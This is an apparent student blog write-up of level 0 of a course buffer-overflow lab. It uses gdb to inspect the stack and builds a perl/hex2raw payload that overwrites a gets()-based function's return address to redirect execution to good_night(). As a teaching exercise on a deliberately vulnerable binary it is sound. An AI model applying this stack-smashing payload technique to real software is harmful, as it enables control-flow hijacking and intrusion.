---
title: 'Level 0. Good Night Like Yesterday'
date: 2016-07-07
permalink: /posts/2016/07/bufflab-level-0/
tags:
  - computer organization and architecture
  - buffer lab
  - assembly
  - good night like yesterday
---

Primary purpose:

We have to provide an input such that after procedure **test()** call function **ah_choo()** program doesn't return to procedure **test()**, yet executes procedure **good_night()** as described below.

> void good_night() {<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printf("OK: Instead of good bye, good night()\n");<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;validate(0);<br />
> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit(0);<br />
> }<br />

We can see that in other words we have to change the return address of function **ah_choo()** so that it doesn't return to procedure **test()**, yet executes procedure **good_night()**.

Beforehand we had known the address of procedure **good_night()**:

> 08048b50 < good_night >: -> address

Now open your terminal, go to the directory where executable file **bufbomb** is located and type this command:

> gdb bufbomb<br />
> (gdb) disas test

Will give this result:

**Dump of assembler code for function test:**

Address | Operation | Elements in operation
--- | --- | --- 
0x08048dbb <+0>:  |   push  | %ebx
0x08048dbc <+1>:  |   sub   | $0x28, %esp
0x08048dbf <+4>:  |   call  | 0x8048da2 < uniqueval >
0x08048dc4 <+9>:  |   mov   | %eax, 0x1c(%esp)
0x08048dc8 <+13>: |   call  | 0x8048d04 < ah_shoo >
0x08048dcd <+18>: |   mov   | %eax, %ebx
0x08048dcf <+20>: |   call  | 0x8048da2 < uniqueval >
0x08048dd4 <+25>: |   mov   | 0x1c(%esp), %edx
0x08048dd8 <+29>: |   cmp   | %edx, %eax
0x08048dda <+31>: |   je    | 0x8048dea < test+47 >
0x08048ddc <+33>: |   movl  | $0x804a26d, (%esp)
0x08048de3 <+40>: |   call  | 0x8048810 < puts@plt >
0x08048de8 <+45>: |   jmp   | 0x8048e30 < test+117 >
0x08048dea <+47>: |   cmp   | 0x804d10c, %ebx
0x08048df0 <+53>: |   jne   | 0x8048e18 < test+93 >
0x08048df2 <+55>: |   mov   | %ebx, 0x8(%esp)
0x08048df6 <+59>: |   movl  | $0x804a282, 0x4(%esp)
0x08048dfe <+67>: |   movl  | $0x1, (%esp)
0x08048e05 <+74>: |   call  | 0x8048900 < __printf_chk@plt >
0x08048e0a <+79>: |   movl  | $0x3, (%esp)
0x08048e11 <+86>: |   call  | 0x8049171 < validate >
0x08048e16 <+91>: |   jmp   | 0x8048e30 < test+117 >

**-Type < return > to continue, or q < return > to quit-**

From above assembly code you can see a line at address 0x08048dc8 <+13> has a command **call 0x8048d04 < ah_shoo >** which means procedure **test()** calls function **ah_shoo()**. The return address of function **ah_shoo()** is 0x08048dcd. Now let's see what function **ah_shoo()** does.

Still using GDB, type this command:

> (gdb) disas ah_shoo

Will give this result:

**Dump of assembler code for function ah_shoo:**

Address | Operation | Elements in operation 
--- | --- | ---
0x08048d04 <+0>:  | sub  | $0xc, %esp
0x08048d07 <+3>:  | call | 0x8048cec <ah_choo>
0x08048d0c <+8>:  | add  | $0xc, %esp
0x08048d0f <+11>: |  ret |

**End of assembler dump.**

We can see that function **ah_shoo()** calls function **ah_choo()**, where the return address of function **ah_choo()** is 0x08048d0c. We have to change this return address so that after function **ah_choo()** being called, program doesn't execute instruction "add $0xc, %esp" etc. which can go back to procedure **test()**.

Let we see what function **ah_choo()** does. 

Still using GDB, type this command:

> (gdb) b ah_choo<br />
> Breakpoint 1 at 0x8048cec<br />
> (gdb) run -u eksperimen<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> Breakpoint 1, 0x08048cec in ah_choo ()<br />

After that type this command:

> (gdb) ni<br />
> (gdb) disas<br />

Will give this result:

**Dump of assembler code for function ah_choo:**

Address | Operation | Elements in operation 
--- | --- | ---
0x08048cec <+0>:    | sub  | $0x4c, %esp
=> 0x08048cef <+3>: | lea  | 0x18(%esp), %eax
0x08048cf3 <+7>:    | mov  | %eax, (%esp)
0x08048cf6 <+10>:   | call | 0x8048c56 <Gets>
0x08048cfb <+15>:   | mov  | $0x1, %eax
0x08048d00 <+20>:   | add  | $0x4c, %esp
0x08048d03 <+23>:   | ret  |

**End of assembler dump.**

**Additional info:** I use "eksperimen" as my username and the cookie generated is 0x1d9ed824.

Ok, next!

From function **ah_choo()** we can see that it calls **gets()**. We need to know the initial position of function **ah_choo()** in saving user input.

Still using GDB, type this command:

> (gdb) ni<br />
> 0x08048cf3 in ah_choo ()<br />
> (gdb) ni<br />
> 0x08048cf6 in ah_choo ()<br />
> (gdb) ni<br />
> AAA<br />
> 0x08048cfb in ah_choo ()<br />
> (gdb) i r<br />

Will give this result:

Info register | |
--- | --- | ---
eax      |     0x55683650  |  1432893008
ecx      |     0xf7fbb8a4  |  -134498140
edx      |     0xa  |  10
ebx      |     0x0  |  0
esp      |     0x55683638  |  0x55683638 <_reserved+1037880>
ebp      |     0x55685ff0  |  0x55685ff0 <_reserved+1048560>
esi      |     0x3  |  3
edi      |     0x0  |  0
eip      |     0x8048cfb   |  0x8048cfb <ah_choo+15>
eflags   |     0x206  |  [ PF IF ]
cs       |     0x23   | 35
ss       |     0x2b   | 43
ds       |     0x2b   | 43
es       |     0x2b   | 43
fs       |     0x0  |   0
gs       |     0x63 |   99

When the program reaches command **gets()**, we need to give an input. Give a string input, where in this case I gave string **AAA** which has value **414141** in hexadecimal.

Then we use command **i r** to see the contents of registers. We can see that the address of register %esp is at 0x55683638. So, what happens on function **ah_choo()**'s stack frame after we give an input **AAA**? 

Still using GDB, type this command:

> (gdb) x/20x $esp

Stack Frame | | | | |
--- | --- | --- | --- | ---
0x55683638 <_reserved+1037880>:  | 0x55683650  | 0x00000000  | 0x55685ff0  | 0xf7e467d4
0x55683648 <_reserved+1037896>:  | 0xf7fba3cc  | 0x55683664  | 0x00414141  | 0xf7e46654
0x55683658 <_reserved+1037912>:  | 0x00000e16  | 0xf7fba3cc  | 0xf7fbb898  | 0x2619a11e
0x55683668 <_reserved+1037928>:  | 0x00000000  | 0xf7fd6000  | 0x00000000  | 0x08048db7
0x55683678 <_reserved+1037944>:  | 0x00000e16  | 0x0000000a  | 0x00000000  | 0x08048d0c

We use command **x/20x $esp** to see the contents of stack frame of the current function as much as 20 blocks with the address of register %esp is at the very bottom, in this case it's located at 0x55683638. Because the address of register %esp is the lowest and each block within the stack has an address with multiple of 4, we can calculate the address where our input **AAA** (**414141**) resides.
 
From above illustration we can see that the stack's block that has value 0x00414141 is located at the second row, and it is our input. To prove our calculation in the right track, let we calculate the address starting from 0x55683638 (the contents of this address is 0x55683650). 

Still using GDB, type this command:  
 
> (gdb) p/x 0x55683638+24<br />
> $1 = 0x55683650<br />
> (gdb) x/ 0x55683650<br />

Address | contents
--- | ---
0x55683650 <_reserved+1037904>:  |  0x00414141<br />

We use **x/ 0x55683650** to see the contents of address 0x55683650. Evidently, the contents of that address is 0x00414141. So that's right if our input **AAA** starts from that address.

Now let's take a look at the contents of the stack. From the previous explanation, we know that the return address of function **ah_choo()** is 0x08048d0c. This return address will make our program being redirect to procedure **test()**. Because we want to redirect it to procedure **good_night()**, we must change that return address with the return address of procedure **good_night()**.
   
We have to find the return address of function **ah_choo()**, namely 0x08048d0c on the stack frame with command **x/20x $esp**. We can find it in the last line. Because we had known that our input resides at address 0x55683650, we can calculate the number of characters needed to overwrite the return address 0x08048d0c. In this case, there are 52 characters represented in hexadecimal (2 digits) that should be included to corrupt all the stack's blocks below the block of return address. That 52 characters are free, it will only be a medium to accompany us to go to the block of function **ah_choo()** return address. After we input that 52 characters, we need 4 characters again to substitute the function **ah_choo()** return address. So, what are the 4 characters? Yes, they are the address of procedure **good_night()**, namely 08048b50.

Quit from GDB by typing **q**.

In your terminal, type this command:

> perl -e 'print "61 "x32, "62 "x20, "50 8b 04 08"' > hex0<br />
> ./hex2raw < hex0 > raw0

The first row is for writing character **61** as much as 32 times and character **62** as much as 20 times and 4 characters of return address into a text file named **hex0**. These characters are free and not neccessarily be 61 or 62. After those free 52 characters, we need to give the return address of procedure **good_night()**. Because my machine is Little Endian, I reverse the address from 08048b50 to **50 8b 04 08**. 

The second row is for converting the input string from text file **hex0** into hexadecimal representation and save it into a file named **raw0**.
 
Then we go back into GDB with these commands:

> gdb bufbomb<br />
> (gdb) run -u eksperimen < raw0<br />
> Userid: eksperimen<br />
> Cookie: 0x1d9ed824<br />
> Masukkan input:<br />
> OK: Instead of good bye, good_night()<br />
> VALID<br />
> Selamat!<br />
> [Inferior 1 (process 3943) exited normally]<br />

WOW! We did it!

Here I come, level 1!
